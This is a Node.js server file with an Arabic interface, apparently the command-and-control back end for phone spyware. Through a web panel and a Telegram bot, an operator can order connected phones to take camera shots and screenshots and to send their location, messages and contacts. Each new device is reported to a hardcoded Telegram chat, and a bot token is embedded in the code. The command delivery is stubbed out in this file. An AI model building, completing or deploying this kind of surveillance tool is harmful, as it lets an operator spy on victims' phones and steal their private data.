const express = require('express');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
app.use(express.json());

// البوت
const BOT_TOKEN = '8422563986:AAE4UYIhz8FEZxETNRrJei9biwIeAiUjP-I';
const bot = new TelegramBot(BOT_TOKEN, { polling: false });

// تخزين الأجهزة المتصلة
const connectedDevices = new Map();

// صفحة الرئيسية
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>تحكم في الهواتف</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {
                font-family: Arial, sans-serif;
                background: linear-gradient(135deg, #667eea, #764ba2);
                color: white;
                margin: 0;
                padding: 20px;
                min-height: 100vh;
            }
            .container {
                max-width: 800px;
                margin: 0 auto;
                text-align: center;
            }
            .header {
                background: rgba(255,255,255,0.1);
                padding: 30px;
                border-radius: 15px;
                margin-bottom: 20px;
                backdrop-filter: blur(10px);
            }
            .btn {
                background: rgba(255,255,255,0.2);
                border: none;
                padding: 15px 20px;
                border-radius: 10px;
                color: white;
                cursor: pointer;
                margin: 5px;
                font-size: 16px;
            }
            .btn:hover {
                background: rgba(255,255,255,0.3);
            }
            .device-list {
                text-align: left;
                margin-top: 20px;
            }
            .device-item {
                background: rgba(255,255,255,0.1);
                padding: 10px;
                margin: 5px 0;
                border-radius: 5px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🎯 تحكم في الهواتف</h1>
                <p>الأجهزة المتصلة: <span id="deviceCount">${connectedDevices.size}</span></p>
                <p>🤖 البوت: <b>ناش</b> (@nohashbbot)</p>
                <p>🔗 السيرفر: <code>https://hamzaa-tawny.vercel.app</code></p>
            </div>
            
            <div>
                <button class="btn" onclick="sendCommand('vibrate')">📳 اهتزاز</button>
                <button class="btn" onclick="sendCommand('camera')">📸 كاميرا</button>
                <button class="btn" onclick="sendCommand('screenshot')">📺 لقطة شاشة</button>
                <button class="btn" onclick="sendCommand('location')">📍 موقع</button>
                <button class="btn" onclick="sendCommand('messages')">💬 رسائل</button>
                <button class="btn" onclick="sendCommand('contacts')">📒 جهات اتصال</button>
            </div>
            
            <div class="device-list" id="devicesList">
                ${Array.from(connectedDevices.values()).map(device => 
                    `<div class="device-item">
                        📱 <b>${device.deviceId}</b> - ${device.model || 'غير معروف'}
                        <br><small>متصل منذ: ${new Date(device.connectedAt).toLocaleTimeString()}</small>
                    </div>`
                ).join('') || '<p>⏳ لا توجد أجهزة متصلة بعد...</p>'}
            </div>
            
            <div style="margin-top: 30px;">
                <a href="https://t.me/nohashbbot" style="color: white; background: #0088cc; padding: 10px 20px; border-radius: 10px; text-decoration: none;">
                    💬 فتح البوت في تليجرام
                </a>
            </div>
        </div>

        <script>
            function sendCommand(command) {
                fetch('/api/send-command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        command: command,
                        target: 'all'
                    })
                })
                .then(r => r.json())
                .then(data => {
                    alert('✅ تم إرسال: ' + command + ' إلى ' + data.sentTo + ' جهاز');
                });
            }
            
            setInterval(() => {
                fetch('/api/devices')
                    .then(r => r.json())
                    .then(devices => {
                        document.getElementById('deviceCount').textContent = devices.length;
                        const devicesList = document.getElementById('devicesList');
                        
                        if (devices.length === 0) {
                            devicesList.innerHTML = '<p>⏳ لا توجد أجهزة متصلة بعد...</p>';
                        } else {
                            devicesList.innerHTML = devices.map(device => 
                                `<div class="device-item">
                                    📱 <b>${device.deviceId}</b> - ${device.model || 'غير معروف'}
                                    <br><small>متصل منذ: ${new Date(device.connectedAt).toLocaleTimeString()}</small>
                                </div>`
                            ).join('');
                        }
                    });
            }, 3000);
        </script>
    </body>
    </html>
  `);
});

// API لتسجيل الجهاز (للتطبيق)
app.post('/api/register-device', (req, res) => {
  const { deviceId, model, version } = req.body;
  
  connectedDevices.set(deviceId, {
    deviceId,
    model: model || 'Unknown Device',
    version: version || '1.0',
    connectedAt: new Date(),
    lastPing: Date.now()
  });
  
  console.log('📱 جهاز متصل:', deviceId, model);
  
  // إشعار البوت بجهاز جديد
  bot.sendMessage('7305720183', 
    `📱 *جهاز جديد متصل*\\n\\n` +
    `🆔 *الرقم:* ${deviceId}\\n` +
    `📟 *الموديل:* ${model || 'غير معروف'}\\n` +
    `🔗 *السيرفر:* hamzaa-tawny.vercel.app\\n\\n` +
    `✅ *الأجهزة النشطة:* ${connectedDevices.size}`,
    { parse_mode: 'Markdown' }
  );
  
  res.json({
    success: true,
    message: 'تم تسجيل الجهاز بنجاح',
    server: 'hamzaa-tawny.vercel.app'
  });
});

// API لإرسال الأوامر
app.post('/api/send-command', (req, res) => {
  const { command, target, deviceId } = req.body;
  
  console.log('📩 أمر مستلم:', command, 'لـ', target || deviceId);
  
  let sentCount = 0;
  
  if (target === 'all') {
    connectedDevices.forEach((device, id) => {
      console.log(`➡️ إرسال ${command} إلى ${id}`);
      sentCount++;
    });
  } else if (deviceId) {
    if (connectedDevices.has(deviceId)) {
      console.log(`➡️ إرسال ${command} إلى ${deviceId}`);
      sentCount = 1;
    }
  }
  
  res.json({
    success: true,
    command: command,
    sentTo: sentCount,
    message: `تم إرسال ${command} إلى ${sentCount} جهاز`
  });
});

// API لقائمة الأجهزة
app.get('/api/devices', (req, res) => {
  const devices = Array.from(connectedDevices.values());
  res.json(devices);
});

// API للـ Ping
app.post('/api/ping', (req, res) => {
  const { deviceId } = req.body;
  
  if (deviceId && connectedDevices.has(deviceId)) {
    connectedDevices.get(deviceId).lastPing = Date.now();
  }
  
  res.json({
    status: 'online',
    server: 'hamzaa-tawny.vercel.app',
    timestamp: new Date().toISOString()
  });
});

// ويب هوك البوت - علشان البوت يرسل أوامر
app.post('/webhook', async (req, res) => {
  try {
    const { message } = req.body;
    
    if (message && message.text) {
      const chatId = message.chat.id;
      const text = message.text;
      
      console.log('🤖 رسالة من البوت:', text);
      
      if (text === '/start') {
        await bot.sendMessage(chatId, 
          `🎯 *بوت التحكم في الهواتف*\\n\\n` +
          `📱 *الأجهزة المتصلة:* ${connectedDevices.size}\\n` +
          `🔗 *السيرفر:* hamzaa-tawny.vercel.app\\n\\n` +
          `🎮 *الأوامر المتاحة:*\\n` +
          `📳 اهتزاز\\n` +
          `📸 كاميرا\\n` +
          `📺 لقطة شاشة\\n` +
          `📍 موقع\\n` +
          `💬 رسائل\\n` +
          `📒 جهات اتصال`,
          { 
            parse_mode: 'Markdown',
            reply_markup: {
              keyboard: [
                ['📳 اهتزاز', '📸 كاميرا'],
                ['📺 لقطة شاشة', '📍 موقع'],
                ['💬 رسائل', '📒 جهات اتصال'],
                ['🔄 عدد الأجهزة']
              ],
              resize_keyboard: true
            }
          }
        );
      }
      
      // أوامر البوت
      if (text === '📳 اهتزاز') {
        await sendCommandFromBot('vibrate', chatId);
      }
      
      if (text === '📸 كاميرا') {
        await sendCommandFromBot('camera', chatId);
      }
      
      if (text === '📺 لقطة شاشة') {
        await sendCommandFromBot('screenshot', chatId);
      }
      
      if (text === '🔄 عدد الأجهزة') {
        await bot.sendMessage(chatId, 
          `📊 *الأجهزة المتصلة:* ${connectedDevices.size}\\n\\n` +
          `${Array.from(connectedDevices.values()).map(device => 
            `📱 ${device.deviceId} - ${device.model || 'غير معروف'}`
          ).join('\\n') || '⏳ لا توجد أجهزة متصلة'}`,
          { parse_mode: 'Markdown' }
        );
      }
    }
    
    res.status(200).json({ ok: true });
  } catch (error) {
    console.log('❌ خطأ في الويب هوك:', error);
    res.status(200).json({ ok: true });
  }
});

// دالة مساعدة لإرسال أوامر من البوت
async function sendCommandFromBot(command, chatId) {
  if (connectedDevices.size === 0) {
    await bot.sendMessage(chatId, '❌ لا توجد أجهزة متصلة حالياً');
    return;
  }
  
  connectedDevices.forEach((device, id) => {
    console.log(`🤖 إرسال ${command} من البوت إلى ${id}`);
  });
  
  await bot.sendMessage(chatId, 
    `✅ تم إرسال أمر *${command}* إلى ${connectedDevices.size} جهاز`,
    { parse_mode: 'Markdown' }
  );
}

// تنظيف الأجهزة المنقطعة
setInterval(() => {
  const now = Date.now();
  connectedDevices.forEach((device, id) => {
    if (now - device.lastPing > 60000) {
      connectedDevices.delete(id);
      console.log('🧹 جهاز منقطع:', id);
    }
  });
}, 30000);

module.exports = app;
